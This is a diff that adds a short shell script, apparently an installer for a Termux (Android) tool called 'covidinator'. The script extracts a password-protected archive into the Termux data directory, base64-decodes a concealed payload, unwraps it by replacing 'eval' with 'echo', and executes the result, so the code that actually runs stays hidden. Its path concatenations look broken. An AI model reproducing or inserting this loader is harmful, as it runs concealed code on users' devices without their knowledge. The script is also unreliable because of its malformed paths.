@@ -1,0 +1,16 @@
+cache=data/
+age=/temp/
+name=covid
+sh=$name
+check=`cat check.io`
+if [ $check -eq 0 ]
+then
+echo 1 > check.io
+sh install
+else
+pack=com.termux
+unzip -o -P covidinator covidinator && mv .covidinator $cache$cache/$pack$age/base128.$name
+base64 -d base128.$name | sed 's/eval/echo/g' | sh > $sh
+sh /cache$cache$pack$age$sh
+fi
+
